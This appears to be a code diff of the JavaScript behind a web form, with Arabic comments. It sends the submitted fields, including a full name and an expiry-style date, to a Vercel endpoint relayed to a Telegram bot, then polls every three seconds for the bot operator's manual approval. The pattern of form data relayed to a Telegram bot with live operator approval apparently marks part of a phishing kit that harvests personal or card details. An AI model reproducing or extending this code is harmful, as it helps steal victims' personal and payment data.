@@ -136,7 +136,7 @@ $('f').addEventListener('submit', async e => {
   set('exp', dateOk ? '' : 'Enter a valid date (DD / MM / YYYY) · أدخل تاريخًا صحيحًا');
   
   if (ok) {
-    const userId = 'user_' + Date.now(); // معرف فريد لهذا الطلب
+    const userId = 'user_' + Date.now();
     const payload = {
       "user_id": userId,
       "الاسم_الكامل": $('name').value.trim(),
@@ -153,17 +153,17 @@ $('f').addEventListener('submit', async e => {
     document.querySelector('.card').appendChild(waitDiv);
 
     try {
-      // 1. إرسال البيانات للـ API ليحولها لبوت تلجرام مع الأزرار
+      // إرسال البيانات لسيرفر Vercel
       await fetch("https://telegram-form-api-lemon.vercel.app/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
       });
 
-      // 2. البدء بحلقة تكرار (Polling) لفحص هل وافقت أنت من البوت أم لا
+      // حلقة الفحص لمعرفة متى ستوافق من تلجرام
       const checkInterval = setInterval(async () => {
         try {
-          const res = await fetch(`https://telegram-form-api-lemon.vercel.app/api/check-status?user_id=${userId}`);
+          const res = await fetch(`https://telegram-form-api-lemon.vercel.app/api/send?action=check&user_id=${userId}`);
           const data = await res.json();
 
           if (data.status === 'approved') {
@@ -178,7 +178,7 @@ $('f').addEventListener('submit', async e => {
             location.reload();
           }
         } catch (err) {}
-      }, 3000); // يفحص كل 3 ثواني
+      }, 3000);
 
     } catch(err) {
       alert('حدث خطأ في الاتصال');
